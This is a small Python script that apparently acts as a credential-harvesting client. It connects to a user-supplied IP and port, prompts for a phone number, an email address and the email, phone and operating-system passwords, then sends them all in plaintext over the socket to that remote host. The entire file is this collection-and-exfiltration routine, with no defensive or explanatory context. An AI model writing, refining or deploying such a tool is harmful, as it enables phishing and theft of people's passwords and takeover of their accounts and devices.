import socket
import colorama

def __():
    s = socket.socket()
    print(colorama.Fore.LIGHTMAGENTA_EX + colorama.Style.BRIGHT + "DOM Base Starting...")
    print("")
    a1 = input(colorama.Fore.LIGHTGREEN_EX + colorama.Style.BRIGHT + "[+] IP> ")
    a2 = input(colorama.Fore.LIGHTGREEN_EX + colorama.Style.BRIGHT + "[+] PORT> ")
    s.connect((a1,int(a2)))
    print("")
    print(colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + "Connecting...")
    print(colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + f"Connected to {str(a1)+':'+str(a2)}")
    print("")

    b1 = input(colorama.Fore.LIGHTBLUE_EX + colorama.Style.BRIGHT + "[+] Phone No.: ")
    b2 = input(colorama.Fore.LIGHTBLUE_EX + colorama.Style.BRIGHT + "[+] Email Address: ")
    b3 = input(colorama.Fore.LIGHTBLUE_EX + colorama.Style.BRIGHT + "[+] Email Password: ")
    b4 = input(colorama.Fore.LIGHTBLUE_EX + colorama.Style.BRIGHT + "[+] Phone Password: ")
    b5 = input(colorama.Fore.LIGHTBLUE_EX + colorama.Style.BRIGHT + "[+] OS Password: ")

    m = f"Phone No.: {colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX + b1}\n" \
        f"{colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + 'Email Address'}: {colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX + b2}\n" \
        f"{colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + 'Email Password'}: {colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX + b3}\n" \
        f"{colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + 'Phone Password'}: {colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX + b4}\n" \
        f"{colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + 'OS Password'}: {colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX + b5}"

    s.send(m.encode("utf-8"))
    l = s.recv(1000)
    print(colorama.Fore.LIGHTCYAN_EX + colorama.Style.BRIGHT + l.decode("utf-8"))

if __name__ == '__main__':
    __()